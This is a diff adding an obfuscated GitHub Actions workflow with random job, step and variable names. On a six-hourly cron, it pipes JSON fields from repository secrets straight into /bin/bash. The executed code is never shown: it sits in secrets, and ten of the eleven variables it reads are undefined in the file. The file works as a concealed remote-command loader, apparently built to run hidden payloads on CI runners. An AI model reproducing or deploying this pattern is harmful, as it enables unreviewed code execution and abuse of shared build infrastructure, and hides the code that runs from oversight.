@@ -1,0 +1,27 @@
+name: gechundan5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gechundan5678
+        env:
+          tpun945: ${{ secrets.tpun945 }}
+        run: |
+          echo $tpun945 | jq -r .cqzt04769 | /bin/bash
+          echo $jhrrk9592 | jq -r .fjq19434 | /bin/bash
+          echo $p4022 | jq -r .eb3746 | /bin/bash
+          echo $jd0251 | jq -r .t4107 | /bin/bash
+          echo $uiqme6198 | jq -r .nf97579 | /bin/bash
+          echo $zh8038 | jq -r .q6471 | /bin/bash
+          echo $xpmt6 | jq -r .gyd0 | /bin/bash
+          echo $pvhkc1742 | jq -r .tif8 | /bin/bash
+          echo $kou565 | jq -r .v5280 | /bin/bash
+          echo $i3778 | jq -r .l4869 | /bin/bash
+          echo $zqmn21073 | jq -r .offl9840 | /bin/bash
+
